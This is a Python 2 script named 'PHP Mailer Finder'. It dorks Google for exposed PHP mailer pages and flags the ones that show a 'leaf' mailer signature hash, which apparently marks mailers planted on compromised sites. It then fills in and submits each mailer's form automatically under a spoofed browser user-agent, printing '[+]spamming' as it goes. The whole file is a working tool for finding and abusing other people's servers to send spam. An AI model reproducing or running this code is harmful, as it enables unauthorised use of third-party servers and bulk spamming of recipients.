
from google import search

import filey
import re
import urllib2
from mechanize import Browser

print"PHP Mailer Finder!"
print"By Fahmi Teka:"
print"https://github.com/fahmiteka"
print"fahmiteka.blogspot.com"
print"https://www.facebook.com/fahmi.teka"
print""
print""
a=raw_input("search for ? :")
x=(filey.randomname(8))
fn=x+'.txt'
filey.makeFile(fn)
h=input("how many rezults you want!? : ")
try:
    for url in search(a, tld='com.pk', lang='es', stop=h):
        print(url)
        p=url+"\n"
        filey.writeFile(fn,p)
except:
    print ""
a=open(fn, "r")               
lines = a.readlines()
filey.formatFile(fn)
goal=raw_input("Special String (nothing for leaf PHPMailer) : ")
if goal=="":
    goal="<b>e10adc3949ba59abbe56e057f20f883e</b>"
for line in lines:
    v=filey.visitWS(line)
    try:
        if goal in v:
            print line+" ::valid mailer::"
            lf=line
            filey.writeFile(fn,lf)
    except:
        print""
a.close()
print"try sending emails !? (Only for leaf) : "
tes=raw_input("0(NO), 1(YES), 2(MANUAL) :")
if tes=="1":
    a=open(fn, "r")
    lines = a.readlines()
    for line in lines:
        try:
            print "[+]spamming "+line
            br = Browser()
            br.set_handle_robots( False )
            br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
            br.open(line)
            br.select_form(nr=0)
            br.form['senderEmail'] = line
            br.form['senderName'] = line
            br.form['replyTo'] = line
            br.form['subject'] = "bot by fahmi"
            br.form[ 'messageLetter' ] = line
            br.form['emailList'] = "fahmi123teka@gmail.com"
            br.submit()
            print"[+] DONE 1"
            br.open(line)
            br.select_form(nr=0)
            br.form['senderEmail'] = line
            br.form['senderName'] = line
            br.form['replyTo'] = line
            br.form['subject'] = "bot by fahmi"
            br.form[ 'messageLetter' ] = line
            br.form['emailList'] = "fahmi123teka@gmail.com"
            br.submit()
            print"[+] DONE 2"
        except:
            print"[-]Failed"
    a.close()
if tes=="2":
    a=open(fn, "r")
    lines = a.readlines()
    a1=raw_input("letter name: ")
    a2=raw_input("mailist name: ")
    for line in lines:
        try:
            print "[+]spamming "+line
            br = Browser()
            br.set_handle_robots( False )
            br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
            br.open(line)
            br.select_form(nr=0)
            #br.form['senderEmail'] = line
            #br.form['senderName'] = line
            #br.form['replyTo'] = line
            #br.form['subject'] = "bot by fahmi"
            br.form[ a1 ] = line
            br.form[a2] = "fahmi123teka@gmail.com"
            br.submit()
            print"[+] DONE"
        except:
            print"[-]Failed"
    a.close()
